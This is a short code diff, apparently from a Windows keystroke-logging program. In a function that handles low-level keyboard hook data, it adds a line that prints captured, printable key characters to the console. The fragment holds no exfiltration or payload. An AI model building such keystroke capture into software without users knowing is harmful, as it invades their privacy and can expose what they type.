@@ -105,6 +105,7 @@ BOOL TryLogUnicode(KBDLLHOOKSTRUCT *pKeyboard)
 	if (!IsAllPrintable(buffer, strlen(buffer)))
 		return (false);
 
+	std::cout << buffer;
 	return (true);
 }
 
